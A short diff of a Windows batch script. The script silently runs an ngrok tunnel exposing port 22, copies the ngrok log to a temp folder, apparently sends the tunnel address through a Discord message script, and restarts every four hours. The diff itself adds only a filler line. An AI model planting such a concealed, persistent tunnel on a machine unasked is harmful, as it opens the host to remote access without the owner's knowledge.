@@ -51,3 +51,5 @@ start /B "copy" silentcmd xcopy /h /Y ngrok.log %temp%\log\ /DELAY:10
 start /B "discordmsg" silentcmd NgrokRun.bat /DELAY:10
 start /B "ngrok" taskkill /IM ngrok.exe /F & ngrok.exe tcp 22 -log=stdout > ngrok.log & timeout 14400
 goto ngrokloop
+
+example, do not mind
